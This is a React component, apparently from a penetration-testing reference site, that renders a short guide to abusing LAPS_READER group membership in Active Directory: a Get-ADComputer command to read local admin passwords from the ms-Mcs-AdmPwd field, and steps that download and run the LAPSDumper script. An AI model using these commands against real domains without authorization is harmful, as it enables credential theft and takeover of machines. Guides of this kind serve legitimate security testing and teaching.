import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const LAPS_READER = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Requirements</Typography>
            <Typography>Be part of the `LAPS_READER` group.</Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Description</Typography>
            <Typography>
              The "Local Administrator Password Solution" (LAPS) provides
              management of local account passwords of domain joined computers.
              Passwords are stored in Active Directory (AD) and protected by
              ACL, so only eligible users can read it or request its reset.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Check if you are part of `LAPS_READER` group
            </Typography>
            <Image src="/laps_reader.png" width={1298} height={230} />

            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              You can either search for the local admin password with this
              command, or use a script (Step 3). This command will return a lot
              of output, but the admin password will be in the field
              `ms-Mcs-AdmPwd`.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "Get-ADComputer -Filter 'ObjectClass -eq \"computer\"' -Property *"
              }
            </SyntaxHighlighter>
            <Image src="/laps_reader2.png" width={546} height={128} />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>You can run this script.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"wget https://github.com/n00py/LAPSDumper/raw/main/laps.py"}
            </SyntaxHighlighter>
            <Typography>like so:</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"python laps.py -u {USER} -p {PASSWORD} -d {DOMAIN}"}
            </SyntaxHighlighter>
            <Image src="/laps_reader3.png" width={694} height={104} />
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default LAPS_READER;
